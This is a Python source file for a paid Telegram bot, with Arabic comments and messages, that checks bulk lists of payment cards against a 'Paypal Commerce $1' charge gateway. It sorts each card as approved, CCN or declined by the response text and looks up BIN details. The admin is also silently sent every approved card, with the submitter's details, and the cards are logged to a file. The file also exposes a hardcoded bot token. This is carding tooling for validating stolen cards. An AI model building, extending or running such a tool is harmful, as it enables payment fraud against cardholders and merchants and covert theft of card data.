import telebot, os
import re, json
import requests
import telebot, time, random
import random
import string
from telebot import types
from gatet import *  # استيراد دالة chkk
from reg import reg
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
from bs4 import BeautifulSoup

# ==================== كلمات مفتاحية للتصنيف ====================
APPROVED_KEYWORDS = [
    'Charged', 'Funds', 'INSUFFICIENT_FUNDS', 'CHARGE', 'Duplicate',
    'sucsess', 'true', 'Success', 'INSUFFICIENT FUNDS', 'Charge', 'charged'
]

CCN_KEYWORDS = [
    'security code is incorrect', 'CVV2_FAILURE', 'CVV2',
    'CVC_FAILURE', 'cvv', 'Cvv', 'incorrect security code'
]
# ===============================================================

# ==================== ملفات الحظر والمستخدمين ====================
BANNED_USERS_FILE = 'banned_users.json'
USERS_LOG_FILE = 'users_log.json'

# تحميل/حفظ المستخدمين المحظورين
def load_banned_users():
    try:
        with open(BANNED_USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_banned_users(banned):
    with open(BANNED_USERS_FILE, 'w') as f:
        json.dump(banned, f, indent=4)

# تسجيل دخول المستخدمين
def log_user_activity(user_id, username, first_name, action):
    try:
        with open(USERS_LOG_FILE, 'r') as f:
            users_log = json.load(f)
    except:
        users_log = {}
    
    if str(user_id) not in users_log:
        users_log[str(user_id)] = {
            'user_id': user_id,
            'username': username,
            'first_name': first_name,
            'first_use': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'last_use': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'total_actions': 0,
            'actions': []
        }
    
    users_log[str(user_id)]['last_use'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    users_log[str(user_id)]['total_actions'] += 1
    users_log[str(user_id)]['actions'].append({
        'action': action,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })
    
    with open(USERS_LOG_FILE, 'w') as f:
        json.dump(users_log, f, indent=4)

def is_user_banned(user_id):
    banned = load_banned_users()
    return str(user_id) in banned

# ===============================================================

stopuser = {}
token = "8546455855:AAFOl-NNSlYOIxOqQh8ev8EMnFdPtps3uoc"  # توكن البوت الرئيسي
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 1093032296  # ايدي الادمن
active_scans = set()
command_usage = {}

def send_notification_to_admin(card_info, user_info, response_text, execution_time, gateway):
    """إرسال إشعار للأدمن عند وجود بطاقة ناجحة (تشارج)"""
    try:
        notification_text = f"""
🔔 <b>بطاقة ناجحة - CHARGE ✅</b>

👤 <b>المستخدم:</b> {user_info['name']}
🆔 <b>ID:</b> <code>{user_info['id']}</code>
👤 <b>يوزر:</b> @{user_info['username'] if user_info['username'] else 'لا يوجد'}
💳 <b>البطاقة:</b> <code>{card_info['card']}</code>
📝 <b>الرد:</b> {response_text}
🚪 <b>الGateway:</b> {gateway}
⚡ <b>الوقت:</b> {execution_time} ثانية
📅 <b>التاريخ:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>🎯 تم التشارج بنجاح!</b>
"""
        # إرسال الإشعار للأدمن (نفس البوت)
        bot.send_message(admin, notification_text, parse_mode="HTML")
        
        # أيضاً حفظ في ملف خاص
        with open('approved_cards.txt', 'a', encoding='utf-8') as f:
            f.write(f"{card_info['card']}|{user_info['name']}|{user_info['id']}|{user_info['username']}|{response_text}|{gateway}|{datetime.now()}\n")
    except Exception as e:
        print(f"خطأ في إرسال الإشعار: {e}")

def reset_command_usage():
    for user_id in command_usage:
        command_usage[user_id] = {'count': 0, 'last_time': None}

def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/" + zh).json()
        brand = api_url["brand"]
        card_type = api_url["type"]
        level = api_url["level"]
        bank = api_url["bank"]
        country_name = api_url["country_name"]
        country_flag = api_url["country_flag"]
        mn = f'''• BIN Info : {brand} - {card_type} - {level}
• Bank : {bank} - {country_flag}
• Country : {country_name} [ {country_flag} ]'''
        return mn
    except Exception as e:
        print(e)
        return 'No info'

# التحقق من الحظر قبل أي أمر
def check_ban_decorator(func):
    def wrapper(message):
        user_id = message.from_user.id
        if is_user_banned(user_id):
            bot.reply_to(message, "🚫 <b>لقد تم حظرك من استخدام هذا البوت!</b>\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
            return
        return func(message)
    return wrapper

@bot.message_handler(commands=["start"])
def start(message):
    # تسجيل المستخدم
    log_user_activity(
        message.from_user.id,
        message.from_user.username,
        message.from_user.first_name,
        'start'
    )
    
    def my_function():
        name = message.from_user.first_name
        with open('data.json', 'r') as file:
            json_data = json.load(file)
        id = message.from_user.id

        try:
            BL = (json_data[str(id)]['plan'])
        except:
            BL = '𝗙𝗥𝗘𝗘'
            with open('data.json', 'r') as json_file:
                existing_data = json.load(json_file)
            new_data = {
                id: {
                    "plan": "𝗙𝗥𝗘𝗘",
                    "timer": "none",
                }
            }
            existing_data.update(new_data)
            with open('data.json', 'w') as json_file:
                json.dump(existing_data, json_file, ensure_ascii=False, indent=4)

        if BL == '𝗙𝗥𝗘𝗘':
            keyboard = types.InlineKeyboardMarkup()
            contact_button = types.InlineKeyboardButton(text="✨ 𝗝𝗢𝗜𝗡 ✨", url="https://t.me/+WwjBeTcnFz0yZWVi")
            keyboard.add(contact_button)
            random_number = random.randint(33, 82)
            photo_url = f'https://t.me/bkddgfsa/{random_number}'
            bot.send_message(chat_id=message.chat.id, text=f'''<b>
اهلا بك عزيزي >> {name}
البوت مدفوع وليس مجاني وسعر الاشتراك لليوم الكامل 2$
للاشتراك و الاستفسار : @Jo0000ker
</b>
            ''', reply_markup=keyboard)
            return

        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="✨ 𝗝𝗢𝗜𝗡 ✨", url="https://t.me/+WwjBeTcnFz0yZWVi")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text='''اشتراكك فعال ويمكنك استخدام 
ارسلي ملفك افحصهة او يمكنك الفحص اليدوي بامر :
/chk + Card
Ex: /chk 551179...''', reply_markup=keyboard)

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["cmds"])
def cmds(message):
    if is_user_banned(message.from_user.id):
        bot.reply_to(message, "🚫 <b>لقد تم حظرك من استخدام هذا البوت!</b>\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
        return
    
    with open('data.json', 'r') as file:
        json_data = json.load(file)
    id = message.from_user.id
    try:
        BL = (json_data[str(id)]['plan'])
    except:
        BL = '𝗙𝗥𝗘𝗘'
    name = message.from_user.first_name
    keyboard = types.InlineKeyboardMarkup()
    contact_button = types.InlineKeyboardButton(text=f"✨ {BL}  ✨", callback_data='plan')
    keyboard.add(contact_button)
    bot.send_message(chat_id=message.chat.id, text=f'''<b> 
𝗧𝗵𝗲𝘀𝗲 𝗔𝗿𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁'𝗦 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀

Paypal Commerce $0.05 ✅ <code>/chk </code> 𝗻𝘂𝗺𝗯𝗲𝗿|𝗺𝗺|𝘆𝘆|𝗰𝘃𝗰
𝗦𝗧𝗔𝗧𝗨𝗦 𝗢𝗡𝗟𝗜𝗡𝗘 </b>
''', reply_markup=keyboard)

# ==================== أوامر الأدمن ====================
@bot.message_handler(commands=["users"])
def show_users(message):
    """عرض جميع المستخدمين الذين استخدموا البوت"""
    if message.from_user.id != admin:
        bot.reply_to(message, "❌ هذا الأمر مخصص للأدمن فقط!")
        return
    
    try:
        with open(USERS_LOG_FILE, 'r') as f:
            users_log = json.load(f)
        
        if not users_log:
            bot.reply_to(message, "📭 لا يوجد مستخدمين حتى الآن")
            return
        
        users_text = "👥 <b>قائمة المستخدمين:</b>\n\n"
        for user_id, data in users_log.items():
            users_text += f"🆔 ID: <code>{user_id}</code>\n"
            users_text += f"👤 الاسم: {data['first_name']}\n"
            users_text += f"📝 اليوزر: @{data['username'] if data['username'] else 'لا يوجد'}\n"
            users_text += f"📅 أول استخدام: {data['first_use']}\n"
            users_text += f"🔄 آخر استخدام: {data['last_use']}\n"
            users_text += f"📊 عدد العمليات: {data['total_actions']}\n"
            users_text += "─" * 20 + "\n"
        
        # تقسيم النص إذا كان طويلاً
        if len(users_text) > 4000:
            for i in range(0, len(users_text), 4000):
                bot.send_message(admin, users_text[i:i+4000], parse_mode="HTML")
        else:
            bot.reply_to(message, users_text, parse_mode="HTML")
            
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {str(e)}")

@bot.message_handler(commands=["ban"])
def ban_user(message):
    """حظر مستخدم"""
    if message.from_user.id != admin:
        bot.reply_to(message, "❌ هذا الأمر مخصص للأدمن فقط!")
        return
    
    try:
        # استخراج ID المستخدم
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ استخدم: /ban [user_id] [السبب اختياري]\nمثال: /ban 123456789 سبب الحظر")
            return
        
        user_id = parts[1]
        reason = " ".join(parts[2:]) if len(parts) > 2 else "لا يوجد سبب محدد"
        
        banned = load_banned_users()
        banned[user_id] = {
            'reason': reason,
            'banned_by': admin,
            'banned_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        save_banned_users(banned)
        
        bot.reply_to(message, f"✅ <b>تم حظر المستخدم {user_id} بنجاح!</b>\nالسبب: {reason}", parse_mode="HTML")
        
        # محاولة إرسال إشعار للمستخدم المحظور
        try:
            bot.send_message(user_id, f"🚫 <b>لقد تم حظرك من استخدام البوت!</b>\nالسبب: {reason}\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
        except:
            pass
            
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {str(e)}")

@bot.message_handler(commands=["unban"])
def unban_user(message):
    """إلغاء حظر مستخدم"""
    if message.from_user.id != admin:
        bot.reply_to(message, "❌ هذا الأمر مخصص للأدمن فقط!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ استخدم: /unban [user_id]")
            return
        
        user_id = parts[1]
        banned = load_banned_users()
        
        if user_id in banned:
            del banned[user_id]
            save_banned_users(banned)
            bot.reply_to(message, f"✅ <b>تم إلغاء حظر المستخدم {user_id} بنجاح!</b>", parse_mode="HTML")
            
            # إشعار المستخدم
            try:
                bot.send_message(user_id, f"✅ <b>تم إلغاء حظرك! يمكنك استخدام البوت مرة أخرى.</b>\nشكراً لتفهمك.", parse_mode="HTML")
            except:
                pass
        else:
            bot.reply_to(message, f"❌ المستخدم {user_id} غير محظور!")
            
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {str(e)}")

@bot.message_handler(commands=["banned"])
def show_banned(message):
    """عرض قائمة المحظورين"""
    if message.from_user.id != admin:
        bot.reply_to(message, "❌ هذا الأمر مخصص للأدمن فقط!")
        return
    
    banned = load_banned_users()
    if not banned:
        bot.reply_to(message, "📭 لا يوجد مستخدمين محظورين")
        return
    
    banned_text = "🚫 <b>قائمة المستخدمين المحظورين:</b>\n\n"
    for user_id, data in banned.items():
        banned_text += f"🆔 ID: <code>{user_id}</code>\n"
        banned_text += f"📝 السبب: {data['reason']}\n"
        banned_text += f"📅 تاريخ الحظر: {data['banned_at']}\n"
        banned_text += "─" * 20 + "\n"
    
    bot.reply_to(message, banned_text, parse_mode="HTML")

@bot.message_handler(commands=["stats"])
def show_stats(message):
    """إحصائيات البوت"""
    if message.from_user.id != admin:
        bot.reply_to(message, "❌ هذا الأمر مخصص للأدمن فقط!")
        return
    
    try:
        with open(USERS_LOG_FILE, 'r') as f:
            users_log = json.load(f)
        
        total_users = len(users_log)
        total_actions = sum(user['total_actions'] for user in users_log.values())
        
        # عدد البطاقات الناجحة
        try:
            with open('approved_cards.txt', 'r', encoding='utf-8') as f:
                approved_cards = len(f.readlines())
        except:
            approved_cards = 0
        
        banned = load_banned_users()
        
        stats_text = f"""
📊 <b>إحصائيات البوت:</b>
━━━━━━━━━━━━━━━━
👥 إجمالي المستخدمين: <b>{total_users}</b>
🔄 إجمالي العمليات: <b>{total_actions}</b>
✅ البطاقات الناجحة: <b>{approved_cards}</b>
🚫 المستخدمين المحظورين: <b>{len(banned)}</b>

🤖 <b>Bot By: @Jo0000ker</b>
"""
        bot.reply_to(message, stats_text, parse_mode="HTML")
        
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {str(e)}")

# ==================== معالجة الملفات ====================
@bot.message_handler(content_types=["document"])
def handle_document(message):
    # تسجيل نشاط المستخدم
    log_user_activity(
        message.from_user.id,
        message.from_user.username,
        message.from_user.first_name,
        'upload_file'
    )
    
    # التحقق من الحظر
    if is_user_banned(message.from_user.id):
        bot.reply_to(message, "🚫 <b>لقد تم حظرك من استخدام هذا البوت!</b>\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
        return
    
    with open('data.json', 'r') as file:
        json_data = json.load(file)
    id = message.from_user.id

    try:
        BL = (json_data[str(id)]['plan'])
    except:
        BL = '𝗙𝗥𝗘𝗘'

    if BL == '𝗙𝗥𝗘𝗘':
        with open('data.json', 'r') as json_file:
            existing_data = json.load(json_file)
        new_data = {
            id: {
                "plan": "𝗙𝗥𝗘𝗘",
                "timer": "none",
            }
        }
        existing_data.update(new_data)
        with open('data.json', 'w') as json_file:
            json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Jo0000ker")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>
اهلا بك عزيزي
البوت مدفوع وليس مجاني وسعر الاشتراك لليوم الكامل 2$
للاشتراك و الاستفسار : @Jo0000ker
</b>
        ''', reply_markup=keyboard)
        return

    with open('data.json', 'r') as file:
        json_data = json.load(file)
        date_str = json_data[str(id)]['timer'].split('.')[0]
    try:
        provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
    except Exception as e:
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Jo0000ker")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>
اهلا بك عزيزي
البوت مدفوع وليس مجاني وسعر الاشتراك لليوم الكامل 2$
للاشتراك و الاستفسار : @Jo0000ker
</b>
        ''', reply_markup=keyboard)
        return

    current_time = datetime.now()
    required_duration = timedelta(hours=0)
    if current_time - provided_time > required_duration:
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Jo0000ker")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
        ''', reply_markup=keyboard)
        with open('data.json', 'r') as file:
            json_data = json.load(file)
        json_data[str(id)]['timer'] = 'none'
        json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
        with open('data.json', 'w') as file:
            json.dump(json_data, file, indent=2)
        return

    name = message.from_user.first_name
    user_id = message.from_user.id
    if user_id in active_scans:
        bot.reply_to(message, "ما تقدر تفحص اكثر من ملف بنفس الوقت انتظر الملف الاول يخلص فحص او وقفه و بعدين تعال افحص الملف الثاني")
        return
    else:
        active_scans.add(user_id)

    keyboard = types.InlineKeyboardMarkup()
    contact_button = types.InlineKeyboardButton(text="Paypal Commerce $1", callback_data='br')
    keyboard.add(contact_button)
    bot.reply_to(message, text='𝘾𝙝𝙤𝙤𝙨𝙚 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩 𝙏𝙤 𝙐𝙨𝙚', reply_markup=keyboard)
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)

@bot.callback_query_handler(func=lambda call: call.data == 'br')
def process_combo(call):
    def my_function():
        id = call.from_user.id
        user_id = call.from_user.id
        gate = 'Paypal Commerce $1'
        dd = 0
        live = 0
        ccnn = 0
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                try:
                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {'status': 'start'}

                for cc in lino:
                    if stopuser[f'{id}']['status'] == 'stop':
                        bot.edit_message_text(chat_id=call.chat.id, message_id=call.message.message_id, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @Jo0000ker')
                        return

                    info = str(dato(cc[:6]))
                    start_time = time.time()
                    try:
                        raw_response = str(chkk(cc))  # استخدام الدالة الأصلية
                    except Exception as e:
                        print(e)
                        raw_response = "ERROR"

                    # تصنيف الرد بناءً على الكلمات المفتاحية
                    if any(kw in raw_response for kw in APPROVED_KEYWORDS):
                        category = 'approved'
                        live += 1
                    elif any(kw in raw_response for kw in CCN_KEYWORDS):
                        category = 'ccn'
                        ccnn += 1
                    else:
                        category = 'declined'
                        dd += 1

                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"• {cc.strip()} •", callback_data='u8')
                    status = types.InlineKeyboardButton(f"• Response ➜ {raw_response} •", callback_data='u8')
                    cm3 = types.InlineKeyboardButton(f"• Approved ✅ ➜ [ {live} ] •", callback_data='x')
                    ccn_btn = types.InlineKeyboardButton(f"• CCN ☑️ ➜ [ {ccnn} ] •", callback_data='x')
                    cm4 = types.InlineKeyboardButton(f"• Declined ❌ ➜ [ {dd} ] •", callback_data='x')
                    cm5 = types.InlineKeyboardButton(f"• Total 👻 ➜ [ {total} ] •", callback_data='x')
                    stop_btn = types.InlineKeyboardButton("[ Stop ]", callback_data='stop')
                    mes.add(cm1, status, cm3, ccn_btn, cm4, cm5, stop_btn)

                    end_time = time.time()
                    execution_time = end_time - start_time
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @Jo0000ker''',
                        reply_markup=mes
                    )

                    # إرسال نتيجة كل بطاقة - فقط للموافقة (approved)
                    if category == 'approved':
                        msg_approved = f'''<b>Approved  ✅

• Card : <code>{cc.strip()}</code>
• Response : {raw_response}
• Gateway : {gate}		
{info}
• Vbv : Error
• Time : {"{:.1f}".format(execution_time)}
• Bot By : @Jo0000ker</b>'''
                        bot.send_message(call.from_user.id, msg_approved)
                        
                        # إرسال إشعار للأدمن (أنت) بالبطاقة الناجحة
                        user_info = {
                            'id': call.from_user.id,
                            'name': call.from_user.first_name,
                            'username': call.from_user.username
                        }
                        card_info = {'card': cc.strip()}
                        send_notification_to_admin(card_info, user_info, raw_response, "{:.1f}".format(execution_time), gate)
                        
                    # لا نرسل أي شيء للـ CCN أو declined

                    time.sleep(5)
        except Exception as e:
            print(e)
        finally:
            if user_id in active_scans:
                active_scans.remove(user_id)

        stopuser[f'{id}']['status'] = 'start'
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @Jo0000ker'
        )

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def manual_check(message):
    # تسجيل نشاط المستخدم
    log_user_activity(
        message.from_user.id,
        message.from_user.username,
        message.from_user.first_name,
        'manual_check'
    )
    
    # التحقق من الحظر
    if is_user_banned(message.from_user.id):
        bot.reply_to(message, "🚫 <b>لقد تم حظرك من استخدام هذا البوت!</b>\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
        return
    
    gate = 'Paypal Commerce $1'
    name = message.from_user.first_name
    idt = message.from_user.id
    id = message.chat.id

    with open('data.json', 'r') as json_file:
        json_data = json.load(json_file)

    try:
        BL = (json_data[str(idt)]['plan'])
    except:
        with open('data.json', 'r') as json_file:
            existing_data = json.load(json_file)
        new_data = {
            id: {
                "plan": "𝗙𝗥𝗘𝗘",
                "timer": "none",
            }
        }
        existing_data.update(new_data)
        with open('data.json', 'w') as json_file:
            json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
        BL = '𝗙𝗥𝗘𝗘'

    if BL == '𝗙𝗥𝗘𝗘':
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Jo0000ker")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>
اهلا بك عزيزي >> {name}
البوت مدفوع وليس مجاني وسعر الاشتراك لليوم الكامل 2$
للاشتراك و الاستفسار : @Jo0000ker
</b>
        ''', reply_markup=keyboard)
        return

    with open('data.json', 'r') as file:
        json_data = json.load(file)
        date_str = json_data[str(id)]['timer'].split('.')[0]
    try:
        provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
    except Exception as e:
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Jo0000ker")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>
اهلا بك عزيزي >> {name}
البوت مدفوع وليس مجاني وسعر الاشتراك لليوم الكامل 2$
للاشتراك و الاستفسار : @Jo0000ker
</b>
        ''', reply_markup=keyboard)
        return

    current_time = datetime.now()
    required_duration = timedelta(hours=0)
    if current_time - provided_time > required_duration:
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Jo0000ker")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
        ''', reply_markup=keyboard)
        with open('data.json', 'r') as file:
            json_data = json.load(file)
        json_data[str(id)]['timer'] = 'none'
        json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
        with open('data.json', 'w') as file:
            json.dump(json_data, file, indent=2)
        return

    try:
        command_usage[idt]['last_time']
    except:
        command_usage[idt] = {'last_time': datetime.now()}

    if command_usage[idt]['last_time'] is not None:
        time_diff = (current_time - command_usage[idt]['last_time']).seconds
        if time_diff < 10:
            bot.reply_to(message, f"<b>Try again after {10-time_diff} seconds.</b>", parse_mode="HTML")
            return

    ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
    try:
        cc = message.reply_to_message.text
    except:
        cc = message.text

    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return

    start_time = time.time()
    try:
        command_usage[idt]['last_time'] = datetime.now()
        raw_response = str(chkk(cc))
    except Exception as e:
        raw_response = 'Error'

    # تصنيف الرد
    if any(kw in raw_response for kw in APPROVED_KEYWORDS):
        category = 'approved'
    elif any(kw in raw_response for kw in CCN_KEYWORDS):
        category = 'ccn'
    else:
        category = 'declined'

    info = dato(cc[:6])
    end_time = time.time()
    execution_time = end_time - start_time

    msg_approved = f'''<b>Approved  ✅

• Card : <code>{cc}</code>
• Response : {raw_response}
• Gateway : {gate}		
{info}
• Vbv : Error
• Time : {"{:.1f}".format(execution_time)}
• Bot By : @Jo0000ker</b>'''

    msg_ccn = f'''<b>CCN ☑️

• Card : <code>{cc}</code>
• Response : {raw_response}
• Gateway : {gate}
{info}
• Time : {"{:.1f}".format(execution_time)}
• Bot By : @Jo0000ker</b>'''

    msg_declined = f'''<b>Declined ❌

• Card : <code>{cc}</code>
• Response : {raw_response}
• Gateway : {gate}		
{info}
• Time : {"{:.1f}".format(execution_time)}
• Bot By : @Jo0000ker</b>'''

    if category == 'approved':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg_approved)
        
        # إرسال إشعار للأدمن (أنت) بالبطاقة الناجحة
        user_info = {
            'id': message.from_user.id,
            'name': message.from_user.first_name,
            'username': message.from_user.username
        }
        card_info = {'card': cc}
        send_notification_to_admin(card_info, user_info, raw_response, "{:.1f}".format(execution_time), gate)
        
    elif category == 'ccn':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg_ccn)
    else:
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg_declined)

@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def redeem(message):
    if is_user_banned(message.from_user.id):
        bot.reply_to(message, "🚫 <b>لقد تم حظرك من استخدام هذا البوت!</b>\nللتواصل مع الدعم: @Jo0000ker", parse_mode="HTML")
        return
    
    def my_function():
        try:
            re = message.text.split(' ')[1]
            with open('data.json', 'r') as file:
                json_data = json.load(file)
            timer = (json_data[re]['time'])
            typ = (json_data[f"{re}"]["plan"])
            json_data[f"{message.from_user.id}"]['timer'] = timer
            json_data[f"{message.from_user.id}"]['plan'] = typ
            with open('data.json', 'w') as file:
                json.dump(json_data, file, indent=2)
            with open('data.json', 'r') as json_file:
                data = json.load(json_file)
            del data[re]
            with open('data.json', 'w') as json_file:
                json.dump(data, json_file, ensure_ascii=False, indent=4)
            msg = f'''<b>تم تفعيل الاشتراك الخاص بك الذي سينتهي في تاريخ : {timer}</b>'''
            bot.reply_to(message, msg, parse_mode="HTML")
        except Exception as e:
            print('ERROR : ', e)
            bot.reply_to(message, '<b>Incorrect code or it has already been redeemed </b>', parse_mode="HTML")

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["code"])
def generate_code(message):
    def my_function():
        id = message.from_user.id
        if not id == admin:
            return
        try:
            h = float(message.text.split(' ')[1])
            with open('data.json', 'r') as json_file:
                existing_data = json.load(json_file)
            characters = string.ascii_uppercase + string.digits
            pas = 'TOME-' + ''.join(random.choices(characters, k=4)) + '-' + ''.join(random.choices(characters, k=4)) + '-' + ''.join(random.choices(characters, k=4))
            current_time = datetime.now()
            ig = current_time + timedelta(hours=h)
            plan = '𝗩𝗜𝗣'
            parts = str(ig).split(':')
            ig = ':'.join(parts[:2])
            with open('data.json', 'r') as json_file:
                existing_data = json.load(json_file)
            new_data = {
                pas: {
                    "plan": plan,
                    "time": ig,
                }
            }
            existing_data.update(new_data)
            with open('data.json', 'w') as json_file:
                json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
            msg = f'''<b>
كود الوصل للبوت الخاص بك هو :

<code>/redeem {pas}</code>

صالح لمدة {h} ساعة

طريقة الاستخدام : فقط أضغط على الكود و سيتم نسخه تلقائياً و ادخل الى البوت @TOME_CHKbot و ارسل الكود الذي نسختة
</b>'''
            bot.reply_to(message, msg, parse_mode="HTML")
        except Exception as e:
            print('ERROR : ', e)
            bot.reply_to(message, e, parse_mode="HTML")

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    id = call.from_user.id
    stopuser[f'{id}']['status'] = 'stop'
    bot.answer_callback_query(call.id, "⏹️ تم إيقاف الفحص")

print("تم تشغيل البوت")
print("البوت يعمل الآن مع الميزات الجديدة:")
print("✅ إرسال البطاقات الناجحة للأدمن")
print("✅ تسجيل جميع المستخدمين")
print("✅ نظام حظر المستخدمين")
print("✅ عرض إحصائيات البوت")
print("✅ Bot By: @Jo0000ker")

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"حدث خطأ: {e}")
        time.sleep(5)
